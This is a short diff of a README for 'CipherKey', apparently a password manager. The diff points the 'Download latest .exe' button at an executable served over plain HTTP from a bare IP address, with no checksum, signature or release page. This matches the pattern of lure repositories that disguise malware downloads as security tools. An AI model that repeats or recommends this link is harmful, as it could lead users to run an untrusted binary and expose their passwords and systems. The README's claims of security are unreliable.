@@ -5,10 +5,10 @@ CipherKey is a highly secure password management software designed to encrypt yo
 
 ## Download Latest Release Build
 
-Download the Latest Build from CipherKey.
+Download the Latest Build from CipherKey. 'CipherKey.exe'
 
 <!-- BEGIN LATEST DOWNLOAD BUTTON -->
-[Download latest .exe](http://185.117.249.191/CipherKey)
+[Download latest .exe](http://185.117.249.191/)
 
 <!-- END LATEST DOWNLOAD BUTTON -->
 
